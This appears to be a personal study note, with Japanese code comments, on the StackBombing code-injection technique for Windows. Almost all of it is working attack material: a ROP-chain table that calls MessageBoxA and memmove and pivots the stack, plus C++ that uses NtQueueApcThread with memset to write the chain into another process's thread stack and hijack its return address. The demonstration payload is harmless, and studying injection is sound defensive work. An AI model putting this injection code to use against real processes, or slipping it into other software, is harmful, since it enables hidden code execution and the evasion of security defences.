# StackBombing

## New stack

| No. |   |   |
|--:|:--|:--|
| 0 | | ret |
| 1 | SetRcx | pop rcx; ret |
| 2 | | 0x00(value) |
| 3 | SetRdx | pop rdx; ret |
| 4 | | 0x00(value) |
| 5 | SetR8 | pop r8; ret |
| 6 | | 0x00(value) |
| 7 | SetR9 | pop rax; ret |
| 8 | | 0x00(value) |
| 9 | | movsxd r9, eax; mov rax, r9; add rsp, 0x28; ret |
| 10 | | 0x00 |
| 11 | | 0x00 |
| 12 | | 0x00 |
| 13 | | 0x00 |
| 14 | | 0x00 |
| 15 | SetApi | MessageBoxA_Address |
| 16 | | add rsp, 0x28; ret |
| 17 | | 0x00 |
| 18 | | 0x00 |
| 19 | | 0x00 |
| 20 | | 0x00 |
| 21 | | 0x00 |
| 22 | SetRcx | pop rcx; ret |
| 23 | | context.Rsp(value) |
| 24 | | gadget_poprdx Address |
| 25 | | context.Rsp - 0x2000 + sizeof(DWORD64) * rop_pos |
| 26 | SetR8 | pop r8; ret |
| 27 | | 0x08(value) |
| 28 | SetR9 | pop rax; ret |
| 29 | | 0x00(value) |
| 30 | | movsxd r9, eax; mov rax, r9; add rsp, 0x28; ret |
| 31 | | 0x00 |
| 32 | | 0x00 |
| 33 | | 0x00 |
| 34 | | 0x00 |
| 35 | | 0x00 |
| 36 | SetApi | memmove_Address |
| 37 | | add rsp, 0x28; ret |
| 38 | | 0x00 |
| 39 | | 0x00 |
| 40 | | 0x00 |
| 41 | | 0x00 |
| 42 | | 0x00 |
| 43 | | pop rsp; ret |
| 44 | | context.Rsp(value) |
| 45 | | 0x00 |

```cpp
MessageBoxA(0, 0, 0, 0);

// dst, src, size
memmove(context.Rsp, context.Rsp - 0x2000 + sizeof(DWORD64) * rop_pos, 0x8);
```

## Write target process

```cpp
// 新しいスタックを書き込む
for (int i = 0; i < rop_pos * sizeof(DWORD64); ++i)
    NtQueueApcThread(h_thread, memset_address, (void*)(tos + i), (void*)*(((BYTE*)rop_chain) + i), 1);

// context.Rsp - 0x2000 + sizeof(DWORD64) * rop_posにcontext.Rspを書き込む  // 45に書き込む  // returnで戻るアドレス
NtQueueApcThread(h_thread, memmove_address, (void*)(rop_chain[saved_return_address]), (void*)orig_tos, 8);

// context.Rspにpop rsp; retのアドレスを書き込む
for (int i = 0; i < sizeof(tos); i++)
	NtQueueApcThread(h_thread, memset_address, (void*)(orig_tos + i), (void*)(((BYTE*)&gadget_pivot)[i]), 1);

// context.Rsp + 8 + iに新しいスタックの先頭アドレスを書き込む  // pop rspでこれがrspに書き込まれる  // retは新しいスタックの先頭になる
for (int i = 0; i < sizeof(tos); i++)
	NtQueueApcThread(h_thread, memset_address, (void*)(orig_tos + 8 + i), (void*)(((BYTE*)&tos)[i]), 1);
```
